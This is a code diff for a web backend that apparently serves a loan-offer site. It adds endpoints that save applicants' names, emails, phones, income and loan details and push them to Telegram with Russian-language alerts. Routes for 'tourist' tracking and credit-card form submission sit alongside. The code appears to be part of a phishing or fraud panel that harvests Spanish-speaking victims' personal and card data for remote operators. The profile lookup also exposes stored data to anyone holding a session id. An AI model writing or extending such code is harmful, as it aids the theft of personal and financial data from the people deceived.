@@ -1089,6 +1089,112 @@ async function handleTouristStatus(req, reply) {
   }
 }
 
+function buildLiteProfile(client) {
+  const submissionData = (client?.submissionData && typeof client.submissionData === 'object')
+    ? client.submissionData
+    : {};
+  const saved = (submissionData.liteProfile && typeof submissionData.liteProfile === 'object')
+    ? submissionData.liteProfile
+    : {};
+  const savedNumber = (value) => {
+    if (value === null || value === undefined || value === '') return null;
+    const numericValue = Number(value);
+    return Number.isFinite(numericValue) ? numericValue : null;
+  };
+  return {
+    name: saved.name || client?.nombre || '',
+    email: saved.email || client?.email || '',
+    phone: saved.phone || submissionData.phone || '',
+    amount: savedNumber(saved.amount),
+    incomeSource: saved.incomeSource || '',
+    monthlyIncome: savedNumber(saved.monthlyIncome),
+    purpose: saved.purpose || '',
+    urgency: saved.urgency || '',
+    term: savedNumber(saved.term),
+    updatedAt: saved.updatedAt || null,
+  };
+}
+
+async function handleGetLiteProfile(req, reply) {
+  reply.header('Cache-Control', 'no-store');
+  const flowSessionId = sanitizeString(String(req.query?.flowSessionId || ''), 80);
+  if (!flowSessionId) return reply.send({ profile: null });
+  try {
+    const client = await prisma.webClient.findUnique({
+      where: { flowSessionId },
+      select: { nombre: true, email: true, submissionData: true },
+    });
+    return reply.send({ profile: client ? buildLiteProfile(client) : null });
+  } catch (err) {
+    console.error('[lite/profile/get]', err?.message || err);
+    return reply.send({ profile: null });
+  }
+}
+
+async function handleSaveLiteProfile(req, reply) {
+  try {
+    const body = asRecord(req.body) ?? {};
+    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
+    if (!flowSessionId) return reply.status(400).send({ error: 'flowSessionId required' });
+
+    const numericAmount = Number(body.amount);
+    const numericIncome = Number(body.monthlyIncome);
+    const numericTerm = Number(body.term);
+    const profile = {
+      name: sanitizeString(getString(body.name), 200),
+      email: sanitizeString(getString(body.email), 200),
+      phone: sanitizeString(getString(body.phone), 30),
+      amount: Number.isFinite(numericAmount) ? Math.max(500, Math.min(100000, Math.round(numericAmount))) : null,
+      incomeSource: sanitizeString(getString(body.incomeSource), 100),
+      monthlyIncome: Number.isFinite(numericIncome) ? Math.max(0, Math.min(100000, Math.round(numericIncome))) : null,
+      purpose: sanitizeString(getString(body.purpose), 160),
+      urgency: sanitizeString(getString(body.urgency), 100),
+      term: Number.isFinite(numericTerm) ? Math.max(1, Math.min(120, Math.round(numericTerm))) : null,
+      updatedAt: new Date().toISOString(),
+    };
+    if (!profile.name || !profile.email || !profile.phone) {
+      return reply.status(400).send({ error: 'contact data required' });
+    }
+
+    const existing = await prisma.webClient.findUnique({
+      where: { flowSessionId },
+      select: { submissionData: true },
+    }).catch(() => null);
+    const submissionData = (existing?.submissionData && typeof existing.submissionData === 'object')
+      ? existing.submissionData
+      : {};
+    const client = await upsertWebClient(flowSessionId, {
+      nombre: profile.name,
+      email: profile.email,
+      status: 'LITE: АНКЕТА ЗАПОЛНЕНА',
+      submissionData: {
+        ...submissionData,
+        phone: profile.phone,
+        liteProfile: profile,
+      },
+    });
+    await createWebEvent(flowSessionId, client?.id, 'lite_profile_completed', {
+      amount: profile.amount,
+      purpose: profile.purpose || null,
+    });
+    sendToTelegram([
+      '*⚡ LITE: КЛИЕНТ ЗАПОЛНИЛ АНКЕТУ*',
+      `Session: \`${flowSessionId}\``,
+      `Имя: *${profile.name}*`,
+      `Email: ${profile.email}`,
+      `Тел: ${profile.phone}`,
+      profile.amount ? `Сумма: *€${profile.amount.toLocaleString('es-ES')}*` : '',
+      profile.incomeSource ? `Доход: ${profile.incomeSource}` : '',
+      profile.purpose ? `Цель: ${profile.purpose}` : '',
+    ].filter(Boolean).join('\n'));
+    broadcastUpdate('clients_changed');
+    return reply.send({ ok: true, profile });
+  } catch (err) {
+    console.error('[lite/profile/save]', err?.message || err);
+    return reply.status(500).send({ error: 'lite_profile_failed' });
+  }
+}
+
 // ─── Credit card form submission ──────────────────────────────────────────────
 
 async function handleCreditCardSubmission(req, reply) {
@@ -4679,6 +4785,8 @@ export async function registerApiRoutes(app) {
 
   // Tourist tracking
   app.post('/api/track', handleTrack);
+  app.get('/api/lite/profile', handleGetLiteProfile);
+  app.post('/api/lite/profile', handleSaveLiteProfile);
   app.post('/api/tourist/call-request', handleCallRequest);
   app.get('/api/tourist/status', handleTouristStatus);
   app.post('/api/credit-card-submission', handleCreditCardSubmission);
